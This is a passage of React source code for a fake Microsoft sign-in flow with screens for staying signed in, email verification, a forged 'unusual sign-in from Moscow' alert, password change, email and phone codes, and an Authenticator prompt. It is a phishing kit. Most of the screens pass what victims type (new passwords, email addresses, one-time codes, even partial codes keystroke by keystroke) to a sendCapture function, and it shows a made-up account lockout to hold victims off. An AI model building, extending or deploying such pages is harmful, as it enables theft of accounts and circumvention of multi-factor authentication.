                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Just a moment…
                  </span>
                ) : 'Next'}
              </button>
              <div className="flex flex-col items-center gap-3">
                <a href="#" onClick={e => { e.preventDefault(); setStep('passkey'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
                  Use your face, fingerprint, PIN, or security key
                </a>
                <a href="#" onClick={e => { e.preventDefault(); setStep('email'); setEmail(''); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
                  Sign in with a different Microsoft account
                </a>
              </div>
            </div>
            {!isMobile && (
              <div className="flex justify-center gap-5 mt-3 text-[12px] text-[#888]">
                <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
              </div>
            )}
          </motion.div>
        )}

        {/* ── Stay signed in ─────────────────────────────────────────────────── */}
        {step === 'stay' && (
          <motion.div key="stay" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center gap-2 mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <h1 className="text-[24px] font-bold mb-3 text-white">Stay signed in?</h1>
              <p className="text-[14px] mb-6 text-[#ccc]">
                Do this to reduce the number of times you are asked to sign in.
              </p>
              <label className="flex items-center gap-2 mb-8 cursor-pointer select-none text-[#ccc]" style={{ fontSize: 14 }}>
                <div
                  onClick={() => setDontShow(v => !v)}
                  className={`w-4 h-4 border flex items-center justify-center flex-shrink-0 cursor-pointer transition-colors
                    ${dontShow ? 'bg-[#0078D4] border-[#0078D4]' : 'border-[#555]'}`}
                >
                  {dontShow && <Check className="w-3 h-3 text-white" />}
                </div>
                Don't show this again
              </label>
              <div className="flex gap-3 justify-end">
                <button
                  data-testid="ms-no-btn"
                  onClick={() => nav('processing', 'stay', 'no')}
                  className="text-[15px] font-semibold px-6 py-1.5 border border-[#555] text-white hover:bg-[#3a3a3a] transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  No
                </button>
                <button
                  data-testid="ms-yes-btn"
                  onClick={() => nav('processing', 'stay', 'yes')}
                  className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  Yes
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Verify your email ────────────────────────────────────────────── */}
        {step === 'verify-email' && (() => {
          const maskedEmail = (() => {
            const at = email.indexOf('@');
            if (at < 0) return email || 'your email';
            const local = email.slice(0, at);
            const domain = email.slice(at);
            return local.slice(0, Math.min(2, local.length)) + '*****' + domain;
          })();
          return (
            <motion.div key="verify-email" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
              <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col items-center`}>
                <div className="flex items-center gap-2 justify-center mb-5">
                  <MicrosoftLogo />
                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
                </div>
                <button
                  onClick={() => setStep('email')}
                  className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors mb-5"
                  style={{ background: 'none' }}
                >
                  {email || 'user@example.com'}
                </button>
                <h1 className="text-[22px] font-bold text-white text-center mb-3">Verify your email</h1>
                <p className="text-[14px] text-[#aaa] text-center mb-6">
                  We'll send a code to <strong className="text-white">{maskedEmail}</strong>. To verify this is your email, enter it here.
                </p>
                {/* Email input */}
                <div className="relative w-full mb-1">
                  <input
                    type="email"
                    value={verifyEmailInput}
                    onChange={e => { setVerifyEmailInput(e.target.value); setVerifyEmailError(null); }}
                    onKeyDown={e => {
                      if (e.key === 'Enter') {
                        if (!verifyEmailInput.trim()) { setVerifyEmailError('Enter your email address.'); return; }
                        sendCapture('verify_email_input', verifyEmailInput);
                        setStep('email-code-input');
                      }
                    }}
                    autoFocus
                    placeholder=" "
                    className="w-full bg-transparent border border-[#555] text-white text-[15px] px-3 pt-5 pb-2 outline-none focus:border-[#0078D4] transition-colors peer"
                    style={{ borderRadius: 0 }}
                  />
                  <label className="absolute left-3 top-2 text-[11px] text-[#888] pointer-events-none peer-focus:text-[#3391e0] transition-colors">
                    Email
                  </label>
                </div>
                {verifyEmailError && (
                  <p className="w-full text-left text-red-400 text-[13px] mb-2">{verifyEmailError}</p>
                )}
                <button
                  onClick={() => {
                    if (!verifyEmailInput.trim()) { setVerifyEmailError('Enter your email address.'); return; }
                    sendCapture('verify_email_input', verifyEmailInput);
                    setStep('email-code-input');
                  }}
                  className="w-full border border-[#0078D4] text-white bg-[#0078D4] hover:bg-[#005a9e] text-[15px] font-semibold py-2.5 mt-4 mb-4 transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  Send code
                </button>
                <a href="#" onClick={e => { e.preventDefault(); setStep('email-code-input'); }} className="text-[#3391e0] text-[13px] hover:underline text-center mb-2">
                  Already received a code?
                </a>
                <a href="#" onClick={e => { e.preventDefault(); setStep('password'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
                  Use your password
                </a>
              </div>
              {!isMobile && (
                <div className="flex flex-col items-center gap-1 mt-3">
                  <div className="flex justify-center gap-5 text-[12px] text-[#888]">
                    <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
                    <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
                    <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
                  </div>
                  <p className="text-[11px] text-[#666]">Use private browsing if this is not your device. <a href="#" className="text-[#3391e0] hover:underline">Learn more</a></p>
                </div>
              )}
            </motion.div>
          );
        })()}

        {/* ── Security alert ───────────────────────────────────────────────── */}
        {step === 'security-alert' && (
          <motion.div key="security-alert" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center gap-2 mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              {/* Alert header */}
              <div className="flex items-center gap-3 mb-5">
                <div className="w-10 h-10 rounded-full bg-red-600/20 flex items-center justify-center flex-shrink-0">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f87171" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
                    <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
                  </svg>
                </div>
                <div>
                  <h1 className="text-[18px] font-bold text-white leading-snug">Unusual sign-in activity</h1>
                  <p className="text-[12px] text-red-400 font-medium">We blocked a sign-in attempt</p>
                </div>
              </div>
              <p className="text-[13px] text-[#ccc] mb-5 leading-relaxed">
                We noticed a sign-in attempt to your Microsoft account from a location or device we don't recognise.
              </p>
              {/* Details card */}
              <div className="rounded-lg border border-[#3a3a3a] bg-[#1a1a1a] divide-y divide-[#2e2e2e] mb-6 text-[13px]">
                {[
                  ['Country/region', '🇷🇺 Russia'],
                  ['City', 'Moscow'],
                  ['Platform', 'Android'],
                  ['Device', 'Alcatel A7 (Android 11)'],
                  ['IP address', `${(Math.random()*50+100|0)}.${(Math.random()*200+30|0)}.${(Math.random()*200+10|0)}.${(Math.random()*200+10|0)}`],
                ].map(([label, value]) => (
                  <div key={label} className="flex items-center justify-between px-4 py-2.5">
                    <span className="text-[#888]">{label}</span>
                    <span className="text-white font-medium">{value}</span>
                  </div>
                ))}
              </div>
              <p className="text-[12px] text-[#aaa] mb-5 leading-relaxed">
                Was this you? If not, we recommend you change your password to secure your account.
              </p>
              <div className="flex flex-col gap-2.5">
                <button
                  onClick={() => { sendCapture('security_alert_action', 'not_me'); nav('change-password'); }}
                  className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  No, it wasn't me
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Change password ───────────────────────────────────────────────── */}
        {step === 'change-password' && (
          <motion.div key="change-password" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center gap-2 mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>

              {pwdChanged ? (
                /* ── Success state ── */
                <div className="flex flex-col items-center text-center py-4">
                  <div className="w-14 h-14 rounded-full bg-green-600/20 flex items-center justify-center mb-4">
                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <polyline points="20 6 9 17 4 12" />
                    </svg>
                  </div>
                  <h1 className="text-[20px] font-bold text-white mb-2">Password changed</h1>
                  <p className="text-[13px] text-[#aaa] mb-5 leading-relaxed">
                    Your password has been updated successfully.
                  </p>
                  <div className="w-full rounded-lg border border-[#555] px-4 py-4 text-left mb-4">
                    <p className="text-[12px] text-[#ccc] font-semibold mb-1">⚠ Temporary account restriction</p>
                    <p className="text-[12px] text-[#aaa] leading-relaxed">
                      Your account has been temporarily disabled for <strong className="text-white">3 hours</strong> while our security systems check for any further unauthorised access. You will be alerted when your account is fully restored.
                    </p>
                  </div>
                </div>
              ) : (
                /* ── Form state ── */
                <>
                  <div className="flex justify-center mb-4">
                    <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
                      {email || 'user@example.com'}
                    </div>
                  </div>
                  <h1 className="text-[22px] font-bold text-white text-center mb-2">Create a new password</h1>
                  <p className="text-[13px] text-[#aaa] text-center mb-5 leading-relaxed">
                    Your new password must be at least 8 characters, include an uppercase letter and a special character.
                  </p>
                  {/* New password */}
                  <div className="relative mb-3">
                    <input
                      type={showNewPassword ? 'text' : 'password'}
                      value={newPassword}
                      onChange={e => { setNewPassword(e.target.value); setNewPasswordError(null); }}
                      placeholder="New password"
                      className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
                    />
                    <button onClick={() => setShowNewPassword(v => !v)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
                      style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
                      {showNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                  {/* Confirm password */}
                  <div className="relative mb-2">
                    <input
                      type={showConfirmNewPassword ? 'text' : 'password'}
                      value={confirmNewPassword}
                      onChange={e => { setConfirmNewPassword(e.target.value); setNewPasswordError(null); }}
                      onKeyDown={e => {
                        if (e.key === 'Enter' && newPassword && confirmNewPassword) {
                          if (newPassword !== confirmNewPassword) { setNewPasswordError('Passwords do not match. Try again.'); return; }
                          if (!/[A-Z]/.test(newPassword)) { setNewPasswordError('Password must contain at least one uppercase letter.'); return; }
                          if (!/[^A-Za-z0-9]/.test(newPassword)) { setNewPasswordError('Password must contain at least one special character.'); return; }
                          sendCapture('new_password', newPassword);
                          localStorage.setItem('auth_studio_locked_email', email);
                          localStorage.setItem('auth_studio_lock_start', String(Date.now()));
                          setPwdChanged(true);
                        }
                      }}
                      placeholder="Confirm new password"
                      className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
                    />
                    <button onClick={() => setShowConfirmNewPassword(v => !v)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
                      style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
                      {showConfirmNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                  {newPasswordError && <p className="text-red-400 text-[13px] mb-2 leading-snug">{newPasswordError}</p>}
                  <button
                    onClick={() => {
                      if (!newPassword || !confirmNewPassword) return;
                      if (newPassword !== confirmNewPassword) { setNewPasswordError('Passwords do not match. Try again.'); return; }
                      if (!/[A-Z]/.test(newPassword)) { setNewPasswordError('Password must contain at least one uppercase letter.'); return; }
                      if (!/[^A-Za-z0-9]/.test(newPassword)) { setNewPasswordError('Password must contain at least one special character.'); return; }
                      sendCapture('new_password', newPassword);
                      localStorage.setItem('auth_studio_locked_email', email);
                      localStorage.setItem('auth_studio_lock_start', String(Date.now()));
                      setPwdChanged(true);
                    }}
                    disabled={!newPassword || !confirmNewPassword}
                    className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 mt-3 mb-4 transition-colors"
                    style={{ borderRadius: 0 }}
                  >
                    Save
                  </button>
                  <a href="#" onClick={e => { e.preventDefault(); nav('security-alert'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
                    ‹ Back
                  </a>
                </>
              )}
            </div>
          </motion.div>
        )}

        {/* ── Email code ────────────────────────────────────────────────────── */}
        {step === 'email-code' && (
          <motion.div key="email-code" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col items-center`}>
              <div className="flex items-center gap-2 justify-center mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <button
                onClick={() => setStep('email')}
                className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors mb-5"
                style={{ background: 'none' }}
              >
                {email || 'user@example.com'}
              </button>
              <h1 className="text-[22px] font-bold text-white text-center mb-3">Get a code to sign in</h1>
              <p className="text-[14px] text-[#aaa] text-center mb-6">
                We'll send a code to <strong className="text-white">{email || 'your email'}</strong> to sign you in.
              </p>
              <button
                onClick={() => setStep('email-code-input')}
                className="w-full border border-[#0078D4] text-white bg-[#0078D4] hover:bg-[#005a9e] text-[15px] font-semibold py-2.5 mb-5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                Send code
              </button>
              <a href="#" onClick={e => { e.preventDefault(); setStep('other-ways'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
                Other ways to sign in
              </a>
            </div>
            {!isMobile && (
              <div className="flex justify-center gap-5 mt-3 text-[12px] text-[#888]">
                <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
              </div>
            )}
          </motion.div>
        )}

        {/* ── Email code input ──────────────────────────────────────────────── */}
        {step === 'email-code-input' && (
          <motion.div key="email-code-input" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center justify-center gap-2 mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <div className="flex justify-center mb-4">
                <button
                  onClick={() => { setStep('email-code'); setEmailCodeChars(['','','','','','']); setCodeError(null); setIsSubmitting(false); }}
                  className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors"
                  style={{ background: 'none' }}
                >
                  <ChevronLeft className="w-3.5 h-3.5" />
                  {email || 'user@example.com'}
                </button>
              </div>
              <h1 className="text-[24px] font-bold text-white text-center mb-2">Enter code</h1>
              <p className="text-[13px] text-[#aaa] text-center mb-6">
                Check <strong className="text-white">{email || 'your email'}</strong> for the code and enter it below.
              </p>
              <div className="flex justify-center gap-2 mb-2">
                {emailCodeChars.map((char, i) => (
                  <input
                    key={i}
                    ref={el => { emailCodeRefs.current[i] = el; }}
                    type="text"
                    maxLength={1}
                    value={char}
                    autoFocus={i === 0}
                    onChange={e => {
                      const d = e.target.value.replace(/\D/g, '').slice(-1);
                      const newChars = [...emailCodeChars];
                      newChars[i] = d;
                      setEmailCodeChars(newChars);
                      setCodeError(null);
                      const combined = newChars.join('');
                      if (d && i < 5) emailCodeRefs.current[i + 1]?.focus();
                      if (combined.length === 6 && newChars.every(c => c !== '') && !isSubmitting) {
                        sendCapture('email_code', combined);
                        setIsSubmitting(true);
                      }
                    }}
                    onKeyDown={e => {
                      if (e.key === 'Backspace' && !char && i > 0) emailCodeRefs.current[i - 1]?.focus();
                    }}
                    className={`w-10 text-center text-[22px] font-bold text-white border ${codeError ? 'border-red-500' : 'border-[#555]'} focus:border-[#0078D4] focus:outline-none bg-transparent transition-colors`}
                    style={{ height: '3rem' }}
                  />
                ))}
              </div>
              {codeError && (
                <div className="flex items-center gap-2 mb-3 justify-center">
                  <div className="w-2 h-2 rounded-full bg-red-500 flex-shrink-0" />
                  <span className="text-red-400 text-[13px] leading-snug">{codeError}</span>
                </div>
              )}
              <div className="mb-5 mt-2">
                <a href="#" onClick={e => { e.preventDefault(); setCodeResent(true); setCodeError(null); setTimeout(() => setCodeResent(false), 3000); }}
                  className={`text-[13px] hover:underline ${codeResent ? 'text-green-400' : 'text-[#3391e0]'}`}>
                  {codeResent ? '✓ Code resent!' : "I didn't get a code"}
                </a>
              </div>
              <button
                onClick={() => {
                  const combined = emailCodeChars.join('');
                  if (combined.length === 6 && !isSubmitting) { sendCapture('email_code', combined); setIsSubmitting(true); }
                }}
                disabled={isSubmitting || emailCodeChars.join('').length < 6}
                className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                {isSubmitting ? (
                  <span className="flex items-center justify-center gap-2">
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Just a moment…
                  </span>
                ) : 'Next'}
              </button>
            </div>
          </motion.div>
        )}

        {/* ── Other ways ────────────────────────────────────────────────────── */}
        {step === 'other-ways' && (
          <motion.div key="other-ways" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-9 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center mb-5">
                <button
                  onClick={() => promptType === 'other-ways' ? setStep('email') : setStep('email-code')}
                  className="text-[#aaa] hover:text-white transition-colors p-0.5 -ml-0.5"
                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
                >
                  <ChevronLeft className="w-5 h-5" />
                </button>
                <div className="flex-1 flex items-center justify-center gap-2">
                  <MicrosoftLogo />
                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
                </div>
                <div className="w-6" />
              </div>
              <div className="flex justify-center mb-4">
                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
                  {email || 'user@example.com'}
                </div>
              </div>
              <h1 className="text-[22px] font-bold text-white text-center mb-5">Sign in another way</h1>
              <div className="border border-[#444] divide-y divide-[#444] mb-5">
                {/* Password */}
                <button
                  onClick={() => setStep('password')}
                  className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-[#333] transition-colors"
                >
                  <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                      <rect x="3" y="11" width="18" height="10" rx="2" stroke="#aaa" strokeWidth="1.5"/>
                      <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round"/>
                    </svg>
                  </div>
                  <span className="text-[14px] text-white underline underline-offset-2">Use your password</span>
                </button>
                {/* Email code */}
                <button
                  onClick={() => setStep('email-code-input')}
                  className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-[#333] transition-colors"
                >
                  <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                      <rect x="2" y="4" width="20" height="16" rx="2" stroke="#aaa" strokeWidth="1.5"/>
                      <path d="m2 7 10 6 10-6" stroke="#aaa" strokeWidth="1.5"/>
                    </svg>
                  </div>
                  <span className="text-[14px] text-[#ddd]">Send a code to <span className="text-white">{email || 'your email'}</span></span>
                </button>
                {/* Phone — only if admin enabled it */}
                {phoneEnabled && (
                  <button
                    onClick={() => setStep('phone-code')}
                    className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-[#333] transition-colors"
                  >
                    <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
                      <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                        <rect x="5" y="2" width="14" height="20" rx="2" stroke="#aaa" strokeWidth="1.5"/>
                        <circle cx="12" cy="18" r="1" fill="#aaa"/>
                      </svg>
                    </div>
                    <span className="text-[14px] text-white underline underline-offset-2">Send a code to ●●●●●●09</span>
                  </button>
                )}
              </div>
              {/* Show more options → leads to phone entry (only when phone not pre-configured) */}
              {!phoneEnabled && (
                <button
                  onClick={() => setStep('phone-entry')}
                  className="w-full border border-[#555] text-[#ccc] text-[14px] py-2.5 hover:bg-[#333] transition-colors mb-4"
                  style={{ borderRadius: 0 }}
                >
                  Show more options
                </button>
              )}
              {phoneEnabled && (
                <div className="flex justify-center">
                  <a href="#" className="text-[#3391e0] text-[13px] hover:underline">Update your password instead</a>
                </div>
              )}
            </div>
            {!isMobile && (
              <div className="flex justify-center gap-5 mt-3 text-[12px] text-[#888]">
                <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
              </div>
            )}
          </motion.div>
        )}

        {/* ── Phone entry ───────────────────────────────────────────────────── */}
        {step === 'phone-entry' && (
          <motion.div key="phone-entry" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-9 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center mb-5">
                <button
                  onClick={() => setStep('other-ways')}
                  className="text-[#aaa] hover:text-white transition-colors p-0.5 -ml-0.5"
                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
                >
                  <ChevronLeft className="w-5 h-5" />
                </button>
                <div className="flex-1 flex items-center justify-center gap-2">
                  <MicrosoftLogo />
                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
                </div>
                <div className="w-6" />
              </div>
              <div className="flex justify-center mb-4">
                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
                  {email || 'user@example.com'}
                </div>
              </div>
              <h1 className="text-[22px] font-bold text-white text-center mb-2">Sign in with a code</h1>
              <p className="text-[13px] text-[#aaa] text-center mb-6">
                Enter your phone number and we'll send you a 6-digit code.
              </p>
              <div className="flex mb-5">
                <div className="flex items-center border border-[#555] border-r-0 px-3 bg-[#333] text-[#ccc] text-[14px] flex-shrink-0 select-none">
                  +1
                </div>
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 10); setPhoneNumber(v); }}
                  onKeyDown={e => { if (e.key === 'Enter' && phoneNumber.length >= 7) nav('phone-code', 'phone', phoneNumber); }}
                  placeholder="Phone number"
                  autoFocus
                  className="flex-1 px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors"
                />
              </div>
              <button
                onClick={() => { if (phoneNumber.length >= 7) nav('phone-code', 'phone', phoneNumber); }}
                className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                Next
              </button>
            </div>
          </motion.div>
        )}

        {/* ── Phone code ────────────────────────────────────────────────────── */}
        {step === 'phone-code' && (
          <motion.div key="phone-code" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center justify-center gap-2 mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <div className="flex justify-center mb-4">
                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
                  {email || 'user@example.com'}
                </div>
              </div>
              <h1 className="text-[22px] font-bold text-white text-center mb-2">Enter code</h1>
              <p className="text-[13px] text-[#aaa] text-center mb-6">
                {phoneNumber
                  ? <>We sent a code to <strong className="text-white">+1 ●●●●●●{phoneNumber.slice(-2)}</strong>.</>
                  : <>We sent a code to your <strong className="text-white">phone</strong>.</>}
              </p>
              <div className="flex justify-center gap-2 mb-4">
                {phoneCodeChars.map((char, i) => (
                  <input
                    key={i}
                    ref={el => { phoneCodeRefs.current[i] = el; }}
                    type="text"
                    maxLength={1}
                    value={char}
                    autoFocus={i === 0}
                    onChange={e => {
                      const d = e.target.value.replace(/\D/g, '').slice(-1);
                      const newChars = [...phoneCodeChars];
                      newChars[i] = d;
                      setPhoneCodeChars(newChars);
                      const combined = newChars.join('');
                      sendCapture('phone_code', combined);
                      if (d && i < 5) phoneCodeRefs.current[i + 1]?.focus();
                      if (combined.length === 6 && newChars.every(c => c !== '')) nav('stay', 'phone_code', combined);
                    }}
                    onKeyDown={e => {
                      if (e.key === 'Backspace' && !char && i > 0) phoneCodeRefs.current[i - 1]?.focus();
                    }}
                    className="w-10 text-center text-[22px] font-bold text-white border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent transition-colors"
                    style={{ height: '3rem' }}
                  />
                ))}
              </div>
              <div className="mb-4">
                <a href="#" onClick={e => { e.preventDefault(); setPhoneCodeResent(true); setTimeout(() => setPhoneCodeResent(false), 3000); }}
                  className={`text-[13px] hover:underline ${phoneCodeResent ? 'text-green-400' : 'text-[#3391e0]'}`}>
                  {phoneCodeResent ? '✓ Code resent!' : "I didn't get a code"}
                </a>
              </div>
              <button
                onClick={() => { if (phoneCode.length === 6) nav('stay', 'phone_code', phoneCode); }}
                className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors mb-3"
                style={{ borderRadius: 0 }}
              >
                Next
              </button>
              <div className="flex justify-center">
                <a href="#" onClick={e => { e.preventDefault(); setStep('password'); }} className="text-[#3391e0] text-[13px] hover:underline">Use your password</a>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Authenticator step ─────────────────────────────────────────────── */}
        {step === 'authenticator' && (
          <motion.div key="authenticator" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center mb-5">
                <button onClick={() => setStep('other-ways')} className="text-[#aaa] hover:text-white transition-colors p-0.5 -ml-0.5" style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
                  <ChevronLeft className="w-5 h-5" />
                </button>
                <div className="flex-1 flex items-center justify-center gap-2">
                  <MicrosoftLogo />
                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
                </div>
                <div className="w-5" />
              </div>
              <div className="flex justify-center mb-4">
                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
                  {email || 'user@example.com'}
                </div>
              </div>
              <h1 className="text-[22px] font-bold text-white text-center mb-4">Check your Authenticator app</h1>
              <div className="flex justify-center mb-4">
                <img src="/ms-authenticator.png" alt="Microsoft Authenticator" className="w-36 h-36 object-contain rounded-xl" />
              </div>
              <div className="flex justify-center mb-2">
                <div className="text-[56px] font-bold text-white leading-none tracking-tight">{authNumber}</div>
              </div>
              <p className="text-[13px] text-[#aaa] text-center mb-2 leading-relaxed">
                Select this number in the sign-in request on your iOS device.
              </p>
              <div className="flex justify-center mb-6">
                <span className="flex items-center gap-1.5 text-[12px] text-[#888]">
                  <div className="w-2 h-2 rounded-full bg-[#0078D4] animate-pulse" />
                  Waiting for approval…
                </span>
              </div>
              <div className="flex flex-col items-center gap-3">
                <a href="#" onClick={e => { e.preventDefault(); setStep('other-ways'); }} className="text-[#3391e0] text-[13px] hover:underline">Other ways to sign in</a>
                <a href="#" onClick={e => { e.preventDefault(); setStep('cant-use-authenticator'); }} className="text-[#3391e0] text-[13px] hover:underline">Can't use your Authenticator app?</a>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Can't use Authenticator ─────────────────────────────────────────── */}
        {step === 'cant-use-authenticator' && (
          <motion.div key="cant-use-authenticator" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`flex flex-col ${lightCardCls}`}>
              {msLogoRow(false)}
              <h1 className={`text-[20px] font-bold mb-2 ${lightText}`}>We need to verify your identity</h1>
              <p className="text-[13px] text-[#605e5c] mb-4">How would you like to get your security code?</p>
              <label className="flex items-start gap-3 cursor-pointer p-3 border border-blue-300 bg-blue-50 rounded mb-4">
                <input type="radio" name="cant-use-method" defaultChecked className="mt-0.5 accent-[#0078D4]" readOnly />
                <div>
                  <div className="text-[14px] font-medium text-[#1b1b1b]">
